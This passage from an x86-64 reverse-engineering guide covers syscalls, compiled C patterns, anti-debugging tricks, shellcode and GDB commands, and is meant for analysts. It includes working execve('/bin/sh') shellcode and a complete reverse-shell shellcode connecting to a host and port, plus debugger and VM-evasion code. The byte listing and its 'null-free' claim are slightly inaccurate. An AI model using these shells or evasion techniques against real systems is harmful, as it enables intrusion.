dec  rcx                    ; RCX = length (not counting null terminator)
; That's strlen()!
```

### CMPS — Compare Strings (memcmp / strcmp)

```asm
; Compare [RSI] with [RDI], set FLAGS, then advance both.
cmpsb        ; Compare byte  [RSI] vs [RDI]
cmpsw        ; Compare word
cmpsd        ; Compare dword
cmpsq        ; Compare qword

; ═══ REPE CMPSB — The memcmp() Implementation ═══
; Compare RCX bytes: [RSI] vs [RDI]. Stop at first difference.
cld
mov  rsi, string1
mov  rdi, string2
mov  rcx, 32                ; Compare 32 bytes
repe cmpsb                  ; Repeat while equal AND RCX > 0
;
; After:
;   ZF = 1 → strings are identical (all 32 bytes matched)
;   ZF = 0 → difference found, RSI/RDI point one past the mismatch
je   strings_equal
jne  strings_different
```

### REP Prefix Summary

```
REP      → repeat RCX times                    (MOVS, STOS, LODS)
REPE     → repeat while equal (ZF=1)           (CMPS, SCAS)
  (same as REPZ)
REPNE    → repeat while not equal (ZF=0)       (CMPS, SCAS)
  (same as REPNZ)

All decrement RCX each iteration and stop when RCX = 0.
```

---

## 16. System Calls — Talking to the Kernel

System calls (syscalls) are how user-space programs request services from the operating system kernel: file I/O, process creation, networking, memory allocation. In malware analysis, syscalls reveal **exactly what the binary is doing** at the OS level.

### How SYSCALL Works on Linux x86-64

```asm
; The SYSCALL instruction:
;   1. Switches from user mode (Ring 3) to kernel mode (Ring 0)
;   2. Kernel reads RAX to determine WHICH system call
;   3. Arguments are in: RDI, RSI, RDX, R10, R8, R9
;      (Note: R10 instead of RCX! SYSCALL uses RCX internally to save RIP)
;   4. Return value goes into RAX (-1 to -4095 = error, errno = -RAX)
;   5. RCX and R11 are DESTROYED (kernel uses them)

; Generic pattern:
mov  rax, SYSCALL_NUMBER    ; Which syscall?
mov  rdi, arg1              ; 1st argument
mov  rsi, arg2              ; 2nd argument
mov  rdx, arg3              ; 3rd argument
mov  r10, arg4              ; 4th argument (NOT RCX!)
mov  r8,  arg5              ; 5th argument
mov  r9,  arg6              ; 6th argument
syscall                     ; Execute!
; RAX now contains return value (or negative error code)
```

### Essential Syscall Numbers (Linux x86-64)

```
Number │ Name         │ RDI          │ RSI          │ RDX          │ What it does
───────┼──────────────┼──────────────┼──────────────┼──────────────┼─────────────────────
  0    │ read         │ fd           │ buf          │ count        │ Read from file descriptor
  1    │ write        │ fd           │ buf          │ count        │ Write to file descriptor
  2    │ open         │ filename     │ flags        │ mode         │ Open a file
  3    │ close        │ fd           │              │              │ Close file descriptor
  9    │ mmap         │ addr         │ length       │ prot         │ Map memory (load libraries!)
 10    │ mprotect     │ addr         │ length       │ prot         │ Change memory permissions
 11    │ munmap       │ addr         │ length       │              │ Unmap memory
 12    │ brk          │ addr         │              │              │ Expand heap
 21    │ access       │ filename     │ mode         │              │ Check file permissions
 33    │ dup2         │ oldfd        │ newfd        │              │ Duplicate fd (shell redirects)
 41    │ socket       │ domain       │ type         │ protocol     │ Create network socket
 42    │ connect      │ sockfd       │ addr         │ addrlen      │ Connect to remote host
 49    │ bind         │ sockfd       │ addr         │ addrlen      │ Bind socket to port
 50    │ listen       │ sockfd       │ backlog      │              │ Listen for connections
 56    │ clone        │ flags        │ stack        │              │ Create thread/process
 57    │ fork         │              │              │              │ Fork process
 59    │ execve       │ filename     │ argv         │ envp         │ Execute program
 60    │ exit         │ status       │              │              │ Exit process
 62    │ kill         │ pid          │ signal       │              │ Send signal to process
101    │ ptrace       │ request      │ pid          │ addr         │ Debug/trace a process
231    │ exit_group   │ status       │              │              │ Exit all threads
```

### Practical Examples

```asm
; ═══ Write "Hello" to stdout ═══
section .data
    msg: db "Hello", 0xA       ; "Hello\n"

section .text
    mov  rax, 1                 ; syscall: write
    mov  rdi, 1                 ; fd: stdout
    lea  rsi, [rel msg]         ; buf: address of message
    mov  rdx, 6                 ; count: 6 bytes
    syscall

; ═══ Open a file, read it, close it ═══
    ; open("/etc/passwd", O_RDONLY)
    mov  rax, 2                 ; syscall: open
    lea  rdi, [rel filename]    ; path
    xor  esi, esi               ; flags: O_RDONLY = 0
    syscall                     ; RAX = file descriptor (or negative error)
    mov  r12, rax               ; Save fd in callee-saved register

    ; read(fd, buffer, 1024)
    mov  rax, 0                 ; syscall: read
    mov  rdi, r12               ; fd from open()
    lea  rsi, [rel buffer]      ; buffer to read into
    mov  rdx, 1024              ; max bytes to read
    syscall                     ; RAX = bytes actually read

    ; close(fd)
    mov  rax, 3                 ; syscall: close
    mov  rdi, r12               ; fd
    syscall

; ═══ Fork + Execve (spawn a shell — classic shellcode pattern) ═══
    mov  rax, 57                ; syscall: fork
    syscall
    test rax, rax               ; RAX = 0 in child, PID in parent
    jnz  parent_process         ; Parent continues

    ; Child: execve("/bin/sh", NULL, NULL)
    mov  rax, 59                ; syscall: execve
    lea  rdi, [rel shell_path]  ; "/bin/sh"
    xor  esi, esi               ; argv = NULL
    xor  edx, edx               ; envp = NULL
    syscall                     ; Never returns on success
```

> **RE Malware Pattern:** Watch for sequences: `socket → connect → dup2 (x3) → execve("/bin/sh")`. This is a **reverse shell** — the malware connects back to the attacker, redirects stdin/stdout/stderr to the socket, then spawns a shell. The attacker gets remote command execution.

> **Anti-Analysis:** Some malware uses raw `syscall` instead of calling libc functions (like `read()`, `write()`) to bypass API hooking and library-level monitoring tools.

---

## 17. Recognizing C Constructs in Assembly

This is the single most practical RE skill — looking at assembly and **mentally decompiling** it back to C/C++. Here's how every common C pattern looks after compilation.

### if / else

```c
// C code:
if (x > 10) {
    do_something();
} else {
    do_other();
}
```

```asm
; Compiled assembly (GCC -O1):
    cmp  dword [rbp - 4], 10    ; Compare x with 10
    jle  .else_branch            ; If x <= 10, jump to else (INVERTED condition!)
    call do_something            ; True branch: x > 10
    jmp  .end_if                 ; Skip else
.else_branch:
    call do_other                ; False branch
.end_if:
```

> **RE KEY INSIGHT:** Compilers INVERT the condition! `if (x > 10)` becomes `jle .else` (jump if NOT greater). The assembly jumps OVER the true branch to the else. Always mentally flip the jump condition to recover the original `if`.

### if / else if / else (chained)

```asm
; if (x == 1)       → action_1()
; else if (x == 2)  → action_2()
; else if (x == 3)  → action_3()
; else               → default_action()

    cmp  edi, 1
    jne  .check_2               ; Not 1? Check next
    call action_1
    jmp  .end
.check_2:
    cmp  edi, 2
    jne  .check_3
    call action_2
    jmp  .end
.check_3:
    cmp  edi, 3
    jne  .default
    call action_3
    jmp  .end
.default:
    call default_action
.end:
; RE Pattern: Chain of CMP + JNE + CALL + JMP = chained if/else if
```

### switch Statement (Jump Table)

```asm
; switch(x) { case 0: ... case 1: ... case 2: ... case 3: ... }
; Compiler generates a JUMP TABLE for dense cases:

    cmp  edi, 3                  ; Check if x > max case
    ja   .default                ; If above 3, go to default (unsigned comparison!)
    lea  rax, [rip + jump_table] ; Load base of jump table
    movsxd rcx, dword [rax + rdi*4]  ; Load offset from table[x]
    add  rcx, rax                ; Compute target = table_base + offset
    jmp  rcx                     ; Jump to computed address!
;
; The jump_table in .rodata contains relative offsets to each case.
;
; RE Pattern: CMP + JA + LEA (table) + indirect JMP = switch statement with jump table
; Ghidra and IDA are usually smart enough to reconstruct this as a switch.

; For SPARSE cases (e.g., case 1, case 100, case 9999):
; Compiler uses if/else chain or binary search instead of a table.
```

### for Loop

```c
// C code:
for (int i = 0; i < n; i++) {
    process(array[i]);
}
```

```asm
    xor  ebx, ebx               ; i = 0
    jmp  .for_cond               ; Jump to condition check first
.for_body:
    mov  edi, dword [r12 + rbx*4] ; array[i] (r12 = array base)
    call process
    inc  ebx                     ; i++
.for_cond:
    cmp  ebx, r13d               ; i < n? (r13d = n)
    jl   .for_body               ; If yes, do body
; 
; RE Pattern: XOR (init) → JMP to cond → body → INC → CMP → JL back
```

### while Loop

```c
// while (ptr != NULL) { ptr = ptr->next; count++; }
```

```asm
    xor  ecx, ecx               ; count = 0
.while_check:
    test rdi, rdi                ; ptr == NULL?
    jz   .while_done             ; Yes → exit loop
    mov  rdi, [rdi + 8]          ; ptr = ptr->next (offset 8 = next field)
    inc  ecx                     ; count++
    jmp  .while_check            ; Loop back to check
.while_done:
;
; RE Pattern: TEST + JZ at top → body → JMP back = while loop
; The linked list traversal (mov rdi, [rdi + N]) is a strong hint.
```

### Ternary Operator (CMOV)

```c
// C code:  result = (a > b) ? a : b;   // max(a, b)
```

```asm
; Optimized with CMOV (no branch!):
    cmp  edi, esi                ; Compare a, b
    mov  eax, esi                ; Assume result = b
    cmovg eax, edi               ; If a > b, result = a
;
; RE Pattern: CMP + MOV + CMOV = ternary or simple if/else that returns a value.
; No branches means no branch prediction misses — this is a compiler optimization.
```

### Struct Member Access

```c
// struct Player { int health; int armor; char* name; int level; };
// player->armor = 100;
// printf("%s", player->name);
```

```asm
    mov  dword [rdi + 4], 100    ; player->armor (offset 4)
    mov  rsi, [rdi + 8]          ; player->name  (offset 8)
    lea  rdi, [rip + fmt]        ; "%s"
    call printf
;
; RE Reconstruction: When you see [reg + constant] patterns, map out ALL offsets
; used with that register to reconstruct the struct layout.
```

### Array with Bounds Check

```asm
; if (index < array_length) { return array[index]; } else { abort(); }
    cmp  esi, dword [rdi + 8]    ; Compare index with array.length
    jae  .out_of_bounds           ; Unsigned compare: catches negative indices too!
    mov  rax, [rdi]               ; Load array.data pointer
    mov  eax, [rax + rsi*4]      ; Return array.data[index]
    ret
.out_of_bounds:
    call __abort                  ; Crash
;
; RE Pattern: CMP + JAE before array access = bounds checking.
; Safe languages (Rust, Go, Java) always have this. C/C++ usually don't.
```

---

## 18. Anti-Reverse-Engineering Tricks

Malware authors and software protectors use these techniques to slow down analysts. Knowing them makes you a better reverse engineer.

### Anti-Debugging: IsDebuggerPresent (Windows)

```asm
; Direct check via PEB (Process Environment Block):
mov  rax, gs:[0x60]          ; RAX = address of PEB (Windows x64)
movzx eax, byte [rax + 2]   ; PEB.BeingDebugged (offset 0x02)
test eax, eax
jnz  .debugger_detected      ; If non-zero, a debugger is attached!
;
; Bypass: In debugger, set PEB.BeingDebugged = 0, or patch the JNZ to JMP over it.
```

### Anti-Debugging: ptrace (Linux)

```asm
; A process can only be traced by ONE debugger. 
; If ptrace(PTRACE_TRACEME) fails, someone is already debugging us.
mov  rax, 101                ; syscall: ptrace
xor  edi, edi                ; PTRACE_TRACEME = 0
xor  esi, esi                ; pid = 0
xor  edx, edx                ; addr = 0
xor  r10d, r10d              ; data = 0
syscall
test rax, rax
js   .being_debugged          ; If negative return → already being traced
;
; Bypass: Hook ptrace to always return 0, or NOP the check.
```

### Anti-Debugging: Timing Check

```asm
; Read CPU timestamp counter before and after a code block.
; If too much time passed → single-stepping in a debugger.
rdtsc                         ; EDX:EAX = timestamp counter
shl  rdx, 32
or   rax, rdx
mov  rbx, rax                 ; Save start time

; ... sensitive code ...

rdtsc                         ; Read again
shl  rdx, 32
or   rax, rdx
sub  rax, rbx                 ; Elapsed cycles
cmp  rax, 0x100000            ; Threshold (tune for normal execution)
ja   .tampering_detected       ; Too many cycles → debugger/VM detected
;
; Bypass: Patch the CMP threshold to a huge value, or NOP the JA.
```

### Opaque Predicates

```asm
; Code that ALWAYS takes one branch but LOOKS like it could go either way.
; Confuses static analysis and decompilers.

; Example: x*(x+1) is ALWAYS even, so the lowest bit is ALWAYS 0.
mov  eax, [rbp - 4]          ; Load some variable x
lea  ecx, [eax + 1]          ; ECX = x + 1
imul eax, ecx                ; EAX = x * (x+1) — always even!
test eax, 1                  ; Check lowest bit
jnz  .dead_code              ; This NEVER executes, but IDA doesn't know that
;
; The real code continues here. The .dead_code might contain garbage bytes
; that confuse the disassembler.

; Another classic: 2 * (x^2 + x) is always divisible by 4.
```

### Junk Code Insertion

```asm
; Meaningless instructions inserted between real code to waste analyst's time:
    push rax                  ; \
    mov  rax, rbx             ;  | These do nothing useful —
    xor  rax, rax             ;  | they cancel each other out.
    pop  rax                  ; /
    
    ; Or instructions that write to dead registers:
    mov  r11, 0xDEADBEEF      ; R11 is never read after this
    lea  r10, [r11 + r11*2]   ; R10 is also dead
    
; RE Tip: IDA/Ghidra decompiler usually optimizes these away.
; But in raw disassembly view, they clutter the listing.
```

### Control Flow Obfuscation (Flattening)

```asm
; Instead of normal if/else/loop flow, all basic blocks are siblings
; under a dispatcher loop:
.dispatcher:
    cmp  eax, 1
    je   .block_A
    cmp  eax, 2
    je   .block_B
    cmp  eax, 3
    je   .block_C
    jmp  .exit
.block_A:
    ; ... do something ...
    mov  eax, 3               ; Next state = block_C
    jmp  .dispatcher
.block_B:
    ; ... do something ...
    mov  eax, 1               ; Next state = block_A
    jmp  .dispatcher
.block_C:
    ; ... do something ...
    mov  eax, 2               ; Next state = block_B
    jmp  .dispatcher
;
; The real execution order is A → C → B, but the code is scrambled.
; Tool: Use symbolic execution or trace logging to recover the real order.
```

### Self-Modifying Code

```asm
; Code that changes its own instructions at runtime:
    mov  byte [rip + .patch_target], 0x90   ; Write NOP (0x90) over the next byte
.patch_target:
    int3                      ; Originally a breakpoint — gets overwritten to NOP
    
    ; Or decrypt code before executing:
    lea  rdi, [rip + encrypted_func]
    mov  rcx, encrypted_func_size
.decrypt_loop:
    xor  byte [rdi], 0x37     ; Simple XOR decryption
    inc  rdi
    dec  rcx
    jnz  .decrypt_loop
    call encrypted_func        ; Now it's valid code!
;
; RE Approach: Set a breakpoint AFTER the decryption loop, then dump the decrypted code.
```

### Detecting Virtual Machines

```asm
; Check for VM-specific CPUID responses:
    mov  eax, 0x40000000      ; Hypervisor CPUID leaf
    cpuid
    ; ECX:EDX:EBX contains hypervisor vendor ID
    ; "VMwareVMware" → VMware
    ; "Microsoft Hv" → Hyper-V
    ; "KVMKVMKVM\0\0\0" → KVM/QEMU
    cmp  ebx, 0x61774D56      ; "VMwa" in little-endian
    je   .running_in_vm
;
; Also common: Check MAC address prefix, check for VM-specific registry keys/files,
; check screen resolution, check number of CPU cores, check disk size.
```

---

## 19. Shellcode Basics

Shellcode is raw machine code bytes that execute independently — no loader, no linker, no ELF/PE headers. It's injected into a process (via buffer overflow, code injection, etc.) and runs directly. Writing and analyzing shellcode teaches you the rawest form of x86-64.

### Shellcode Rules

```
1. NO NULL BYTES (0x00)
   Many injection vectors use C string functions (strcpy, gets).
   A null byte = string terminator = truncated shellcode = crash.

2. POSITION INDEPENDENT
   You don't know where in memory your shellcode will land.
   No absolute addresses! Everything must be relative (RIP-relative, stack-relative).

3. SELF-CONTAINED
   No linking. No library calls (unless you resolve them manually).
   Use raw syscalls or find function addresses at runtime.
```

### The Null Byte Problem and Solutions

```asm
; ═══ BAD (contains null bytes) ═══
mov  rax, 0x0000000000000001  ; Encodes as 48 B8 01 00 00 00 00 00 00 00
                              ; That's EIGHT null bytes!
mov  rdi, 0                   ; 48 C7 C7 00 00 00 00 — three nulls

; ═══ GOOD (null-free equivalents) ═══
xor  eax, eax                ; RAX = 0 (31 C0 — no nulls!)
inc  eax                     ; RAX = 1 (FF C0 — no nulls!)
; Or:
push 1                       ; (6A 01)
pop  rax                     ; (58)  → RAX = 1, only 3 bytes, no nulls!

xor  edi, edi                ; RDI = 0 (31 FF — no nulls!)
xor  edx, edx                ; RDX = 0

; For larger values:
mov  al, 59                  ; Only sets low byte (B0 3B — two bytes, no nulls)
; Works when upper bytes are already zero (from XOR EAX, EAX)
```

### Classic x86-64 Linux execve("/bin/sh") Shellcode

```asm
; Spawn a shell. The "hello world" of shellcode.
; 
; execve("/bin/sh", NULL, NULL)
; RAX = 59 (execve syscall number)
; RDI = pointer to "/bin/sh"
; RSI = 0 (NULL argv)
; RDX = 0 (NULL envp)

shellcode:
    xor  esi, esi                ; RSI = 0 (argv = NULL)
    push rsi                     ; Push null terminator onto stack
    mov  rdi, 0x68732f6e69622f   ; "/bin/sh" in little-endian (no trailing null needed —
                                 ; it was pushed above)
    push rdi                     ; Push "/bin/sh" string onto stack
    push rsp
    pop  rdi                     ; RDI = pointer to "/bin/sh" on stack
    xor  edx, edx                ; RDX = 0 (envp = NULL)
    push 59
    pop  rax                     ; RAX = 59 (execve) — avoids null bytes from mov rax, 59
    syscall                      ; Execute!

; Assembled bytes (23 bytes, null-free):
; 31 F6 56 48 BF 2F 62 69 6E 2F 73 68 57 54 5F 31 D2 6A 3B 58 0F 05
```

### Finding Strings Without Data Section

```asm
; Shellcode has no .data section. Three techniques:

; ═══ Method 1: PUSH string onto stack (shown above) ═══

; ═══ Method 2: JMP-CALL-POP (classic technique) ═══
jmp  .get_string              ; Jump forward past the string data
.got_string:
    pop  rdi                  ; POP return address = address of the string!
    ; ... use RDI as string pointer ...
    jmp  .continue

.get_string:
    call .got_string          ; CALL pushes the address of the NEXT instruction
    db   "/bin/sh", 0         ; The string lives here, right after the CALL
;
; How it works:
;   1. JMP skips over the string
;   2. CALL pushes the address of "/bin/sh" (which follows the CALL)
;   3. POP retrieves that address — now we have a pointer to our string!

; ═══ Method 3: LEA with RIP-relative ═══
lea  rdi, [rip + string_offset]   ; Works in 64-bit — cleaner than JMP-CALL-POP
```

### Reverse Shell Shellcode Pattern

```asm
; The most common real-world shellcode. Connects back to attacker.
; socket() → connect() → dup2() × 3 → execve("/bin/sh")

    ; socket(AF_INET, SOCK_STREAM, 0)
    push 41                      ; syscall: socket
    pop  rax
    push 2                       ; AF_INET
    pop  rdi
    push 1                       ; SOCK_STREAM
    pop  rsi
    xor  edx, edx                ; protocol = 0
    syscall
    mov  r12, rax                ; Save socket fd

    ; connect(sockfd, &addr, sizeof(addr))
    ; struct sockaddr_in on stack:
    push rdx                     ; padding
    mov  dword [rsp], 0x0100007F ; 127.0.0.1 in network byte order
    push word 0x5C11             ; Port 4444 in network byte order (0x115C)
    push word 2                  ; AF_INET
    mov  rsi, rsp                ; RSI = pointer to sockaddr_in
    push 42                      ; syscall: connect
    pop  rax
    mov  rdi, r12                ; sockfd
    push 16
    pop  rdx                     ; addrlen = 16
    syscall

    ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
    ; Redirect stdin, stdout, stderr to the socket
    xor  esi, esi                ; fd = 0 (stdin)
.dup_loop:
    push 33                      ; syscall: dup2
    pop  rax
    mov  rdi, r12                ; sockfd
    syscall
    inc  esi                     ; Next fd: 1 (stdout), then 2 (stderr)
    cmp  esi, 3
    jl   .dup_loop

    ; execve("/bin/sh", NULL, NULL) — same as before
    xor  esi, esi
    push rsi
    mov  rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop  rdi
    xor  edx, edx
    push 59
    pop  rax
    syscall
;
; When you see this pattern in malware, report the IP address and port!
```

> **RE Tip:** To extract the IP/port from shellcode: look for the `connect` syscall's `sockaddr_in` structure. The IP is a 4-byte value in network byte order, and the port is a 2-byte value in network byte order.

---

## 20. GDB Cheat Sheet for Reverse Engineers

GDB (GNU Debugger) is your primary dynamic analysis tool on Linux. Combined with GEF, pwndbg, or PEDA, it becomes incredibly powerful. These are the commands you'll use daily.

### Starting GDB

```bash
gdb ./binary                  # Load binary
gdb -q ./binary               # Quiet mode (skip banner)
gdb -p <PID>                  # Attach to running process
gdb --args ./binary arg1 arg2 # Load with arguments
```

### Essential Execution Commands

```
run (r)                        Run the program from the start
run < input.txt                Run with stdin from file
continue (c)                   Continue execution after breakpoint
stepi (si)                     Execute ONE assembly instruction (step INTO calls)
nexti (ni)                     Execute ONE instruction (step OVER calls)
finish                         Run until current function returns
until *0x401234                Run until specific address
```

### Breakpoints

```
break *0x401000                Breakpoint at address
break main                     Breakpoint at symbol
break *main+42                 Breakpoint at offset from symbol
info breakpoints (i b)         List all breakpoints
delete 1                       Delete breakpoint #1
delete                         Delete ALL breakpoints
disable 2                      Temporarily disable breakpoint #2
enable 2                       Re-enable it
condition 1 $rax==0            Breakpoint #1 only triggers when RAX == 0
break *0x401000 if $rcx > 10   Conditional breakpoint (inline)

# Hardware breakpoints (limited to 4, but can't be detected by anti-debug):
hbreak *0x401000               Hardware execution breakpoint
watch *0x7fffffffe000          Hardware watchpoint: break when memory CHANGES
rwatch *0x7fffffffe000         Break when memory is READ
awatch *0x7fffffffe000         Break on read OR write
```

### Examining Registers

```
info registers (i r)           Show all general-purpose registers
info registers rax rbx         Show specific registers
print $rax                     Print RAX value
print/x $rax                   Print in hex
print/d $rax                   Print in decimal
print/t $rax                   Print in binary
set $rax = 0                   Modify register value
set $rip = 0x401000            Jump to address (change program counter!)
set $eflags |= (1 << 6)       Set Zero Flag (ZF is bit 6)
set $eflags &= ~(1 << 6)      Clear Zero Flag
```

### Examining Memory

```
# Format: x/[count][format][size] address
# Formats: x=hex, d=decimal, s=string, i=instruction, c=char
# Sizes: b=byte, h=halfword(2), w=word(4), g=giant(8)

x/10gx $rsp                   10 qwords in hex at RSP (stack dump)
x/20i $rip                    20 instructions at current RIP (disassembly)
x/s 0x402000                  String at address
x/100bx $rdi                  100 bytes in hex (hexdump)
x/4gx $rsp                    4 qwords at stack top (see return address)
x/i $rip                      Current instruction about to execute

# Extremely useful combinations:
x/gx $rsp                     See what RET will jump to (top of stack)
x/10gx $rbp-0x40              Dump local variables
x/s $rdi                      Print 1st argument (System V: string arg)
```

### Disassembly

```
disassemble main               Disassemble function
disassemble $rip, $rip+50     Disassemble range
set disassembly-flavor intel   USE INTEL SYNTAX (put in ~/.gdbinit!)
```

### Memory Modification

```
set {int}0x7fffffffe000 = 42   Write integer to memory
set {char}0x7fffffffe000 = 'A' Write byte
set *(unsigned long*)$rsp = 0x401234   Overwrite return address on stack!
```

### Process Memory Map

```
info proc mappings              Show all memory regions (stack, heap, libs)
# Or:  vmmap  (if using GEF/pwndbg)
#
# Critical for finding:
# - Stack region (rwx? rw-?)
# - Heap location
# - Loaded shared libraries
# - .text section (is it writable? Self-modifying code!)
# - ASLR randomization of regions
```

### Useful Tricks for RE

```bash
# Follow child after fork:
set follow-fork-mode child

# Log all syscalls:
catch syscall
catch syscall write             # Only catch write() syscalls

# Disable ASLR (for reproducible debugging):
set disable-randomization on    # Default in GDB

# Dump memory region to file:
dump binary memory /tmp/dump.bin 0x400000 0x401000

# Search memory for pattern:
find 0x400000, 0x500000, "/bin/sh"      # Find string in memory
find /b 0x400000, 0x500000, 0x48, 0x89  # Find byte sequence (mov r??, r??)

# Python scripting in GDB:
python print(gdb.parse_and_eval("$rax"))
```

### Recommended .gdbinit

```bash
# Put this in ~/.gdbinit:
set disassembly-flavor intel
set pagination off
set confirm off
# If using GEF:
# source /path/to/gef.py
# If using pwndbg:
# source /path/to/pwndbg/gdbinit.py
```

> **Pro Tip:** Install [GEF](https://github.com/hugsy/gef) or [pwndbg](https://github.com/pwndbg/pwndbg). They add colored register displays, heap analysis, stack visualization, ROP gadget finding, and much more — essential for exploit development.

---

## 21. Quick Reference Card

### Registers at a Glance

| 64-bit | 32-bit | 16-bit | 8-bit (low) | 8-bit (high) | Primary Role |
|--------|--------|--------|-------------|---------------|--------------|
| RAX | EAX | AX | AL | AH | Return value, accumulator |
| RBX | EBX | BX | BL | BH | Callee-saved (general) |
| RCX | ECX | CX | CL | CH | 4th arg (Win) / loop counter |
| RDX | EDX | DX | DL | DH | 3rd arg (SysV), 2nd (Win) |
| RSI | ESI | SI | SIL | — | 2nd arg (SysV), string source |
| RDI | EDI | DI | DIL | — | 1st arg (SysV), string dest |
| RSP | ESP | SP | SPL | — | Stack pointer |
| RBP | EBP | BP | BPL | — | Frame pointer |
| R8  | R8D | R8W | R8B | — | 5th arg (SysV), 4th (Win) |
| R9  | R9D | R9W | R9B | — | 6th arg (SysV) |
| R10 | R10D | R10W | R10B | — | 4th syscall arg (Linux) |
| R11 | R11D | R11W | R11B | — | Scratch, destroyed by syscall |
| R12–R15 | R12D–R15D | — | — | — | Callee-saved (general) |

### Argument Passing Cheat Sheet

```
                 Arg1   Arg2   Arg3   Arg4   Arg5   Arg6   7th+
System V (Linux): RDI    RSI    RDX    RCX    R8     R9     Stack
Windows x64:      RCX    RDX    R8     R9     —      —      Stack (+shadow)
Linux Syscall:    RDI    RSI    RDX    R10    R8     R9     (RAX = syscall #)
```

### Instruction Quick Reference

| Category | Instruction | What It Does |
|----------|-------------|--------------|
| **Move** | `mov dst, src` | dst = src |
| | `lea dst, [addr]` | dst = address (no deref) |
| | `movzx dst, src` | Zero-extend and move |
| | `movsx dst, src` | Sign-extend and move |
| | `xchg a, b` | Swap a and b |
| | `cmovCC dst, src` | Conditional move |
| **Arithmetic** | `add dst, src` | dst += src |
| | `sub dst, src` | dst -= src |
| | `imul dst, src` | dst *= src (signed) |
| | `mul src` | RDX:RAX = RAX * src (unsigned) |
| | `div src` | RAX = RDX:RAX / src, RDX = remainder |
| | `inc dst` | dst++ |
| | `dec dst` | dst-- |
| | `neg dst` | dst = -dst (two's complement) |
| **Logical** | `and dst, src` | dst &= src |
| | `or dst, src` | dst \|= src |
| | `xor dst, src` | dst ^= src |
| | `not dst` | dst = ~dst |
| | `shl dst, n` | dst <<= n |
| | `shr dst, n` | dst >>= n (logical, zero-fill) |
| | `sar dst, n` | dst >>= n (arithmetic, sign-fill) |
| | `rol/ror dst, n` | Rotate left/right |
| **Compare** | `cmp a, b` | Set flags for (a - b) |
| | `test a, b` | Set flags for (a & b) |
| **Jump** | `jmp target` | Unconditional jump |
| | `je / jz` | Jump if equal (ZF=1) |
| | `jne / jnz` | Jump if not equal (ZF=0) |
| | `jg / jl` | Greater / Less (signed) |
| | `ja / jb` | Above / Below (unsigned) |
| **Stack** | `push src` | RSP -= 8; [RSP] = src |
| | `pop dst` | dst = [RSP]; RSP += 8 |
| | `call target` | push RIP; jmp target |
| | `ret` | pop RIP |
| | `leave` | mov rsp, rbp; pop rbp |
| **String** | `rep movsb` | memcpy(RDI, RSI, RCX) |
| | `rep stosb` | memset(RDI, AL, RCX) |
| | `repne scasb` | strlen(RDI) when AL=0 |
| | `repe cmpsb` | memcmp(RSI, RDI, RCX) |
| **System** | `syscall` | Invoke kernel (Linux x86-64) |
| | `int 0x80` | Legacy 32-bit syscall |
| | `nop` | No operation (0x90) |
| | `int3` | Debugger breakpoint (0xCC) |
| | `cpuid` | CPU identification |
| | `rdtsc` | Read timestamp counter |

### Common Patterns — Instant Recognition

```
xor eax, eax                → Zero a register (RAX = 0)
test rax, rax + jz          → if (ptr == NULL)
cmp + jCC                   → if/else condition
cmp + ja + lea + jmp [reg]  → switch (jump table)
push rbp; mov rbp,rsp       → Function prologue
leave; ret                  → Function epilogue
mov rdi, X; call Y          → Function call with 1st arg
rep stosb with AL=0          → memset(buf, 0, n) — zeroing memory
lodsb + xor/add + stosb     → Inline decryption/encoding
mov rax,[rdi]; call [rax+N] → C++ virtual function call (vtable)
fs:[0x28] / gs:[0x14]       → Stack canary check
sub rsp, 0x28 (Windows)     → Shadow space allocation
```

### Critical Syscall Numbers (Linux x86-64)

```
 0 = read      1 = write     2 = open      3 = close
 9 = mmap     10 = mprotect  12 = brk      21 = access
33 = dup2     41 = socket    42 = connect   56 = clone
57 = fork     59 = execve    60 = exit      62 = kill
101 = ptrace  231 = exit_group
```

---

*Guide complete. Go break things (legally). 🔓*

